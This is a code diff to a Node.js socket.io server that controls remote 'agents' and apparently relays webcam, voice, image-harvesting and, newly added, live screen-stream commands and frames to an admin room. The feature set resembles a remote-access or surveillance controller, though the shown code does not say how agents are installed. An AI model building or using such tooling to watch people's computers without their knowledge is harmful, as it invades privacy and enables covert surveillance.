@@ -17,7 +17,9 @@ const BLOCKED_IP_CACHE_TTL_MS = Math.max(Number(process.env.BLOCKED_IP_CACHE_TTL
 const ADMIN_ROOM = 'admins';
 const AGENT_ROOM = 'agents';
 const AGENT_STATIC_ROUTE = '/agent';
+const STREAM_VIEWER_ROUTE = '/live-stream';
 const AGENT_UPDATES_DIR = path.join(__dirname, 'agent-updates');
+const STREAM_VIEWER_DIR = path.join(__dirname, 'stream-viewer');
 const AGENT_BINARY_NAME = process.env.AGENT_BINARY_NAME || 'RemoteAgent.exe';
 const AGENT_MANIFEST_NAME = process.env.AGENT_MANIFEST_NAME || 'latest.json';
 const AGENT_DOWNLOAD_BASE_URL = String(process.env.AGENT_DOWNLOAD_BASE_URL || '').trim().replace(/\/+$/, '');
@@ -526,6 +528,13 @@ app.use(AGENT_STATIC_ROUTE, express.static(AGENT_UPDATES_DIR, {
     }
 }));
 
+if (fs.existsSync(STREAM_VIEWER_DIR)) {
+    app.use(STREAM_VIEWER_ROUTE, express.static(STREAM_VIEWER_DIR, {
+        index: 'live-stream.html',
+        extensions: ['html', 'js', 'css']
+    }));
+}
+
 app.get(`${AGENT_STATIC_ROUTE}/${AGENT_MANIFEST_NAME}`, async (req, res) => {
     const manifestPath = getAgentManifestPath();
 
@@ -848,6 +857,7 @@ io.on('connection', (socket) => {
             recording: false,
             cameraOn: false,
             voiceRecording: false,
+            screenStreaming: false,
             imageSyncRunning: false,
             imageSyncNextIndex: 0,
             imageSyncTotalFiles: 0
@@ -865,6 +875,7 @@ io.on('connection', (socket) => {
         const hasRecording = typeof data.recording === 'boolean';
         const hasCameraOn = typeof data.cameraOn === 'boolean';
         const hasVoiceRecording = typeof data.voiceRecording === 'boolean';
+        const hasScreenStreaming = typeof data.screenStreaming === 'boolean';
 
         agents[socket.id] = {
             ...previous,
@@ -872,6 +883,7 @@ io.on('connection', (socket) => {
             recording: hasRecording ? data.recording : Boolean(previous.recording),
             cameraOn: hasCameraOn ? data.cameraOn : Boolean(previous.cameraOn),
             voiceRecording: hasVoiceRecording ? data.voiceRecording : Boolean(previous.voiceRecording),
+            screenStreaming: hasScreenStreaming ? data.screenStreaming : Boolean(previous.screenStreaming),
             lastStateAt: Date.now()
         };
 
@@ -882,6 +894,7 @@ io.on('connection', (socket) => {
             recording: agents[socket.id].recording,
             cameraOn: agents[socket.id].cameraOn,
             voiceRecording: agents[socket.id].voiceRecording,
+            screenStreaming: agents[socket.id].screenStreaming,
             source: data.source || 'agent'
         });
     });
@@ -949,6 +962,22 @@ io.on('connection', (socket) => {
         emitControlAck('stop_voice_capture', result);
     });
 
+    socket.on('admin_start_screen_stream', (payload) => {
+        if (!isAdmin) {
+            return;
+        }
+        const result = emitControl('start_screen_stream', payload);
+        emitControlAck('start_screen_stream', result);
+    });
+
+    socket.on('admin_stop_screen_stream', (payload) => {
+        if (!isAdmin) {
+            return;
+        }
+        const result = emitControl('stop_screen_stream', payload);
+        emitControlAck('stop_screen_stream', result);
+    });
+
     socket.on('admin_find_image_and_save', (payload) => {
         if (!isAdmin) {
             return;
@@ -992,6 +1021,20 @@ io.on('connection', (socket) => {
             ...data,
             agentId: socket.id,
             machine: agent.machine
+        });
+    });
+
+    socket.on('screen_stream_frame', (data = {}) => {
+        if (isAdmin) {
+            return;
+        }
+
+        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
+        io.to(ADMIN_ROOM).emit('ui_screen_stream_frame', {
+            ...data,
+            agentId: socket.id,
+            machine: agent.machine,
+            sentAt: Date.now()
         });
     });
 
@@ -1125,6 +1168,7 @@ io.on('connection', (socket) => {
             recording: false,
             cameraOn: false,
             voiceRecording: false,
+            screenStreaming: false,
             source: 'disconnect'
         });
     });
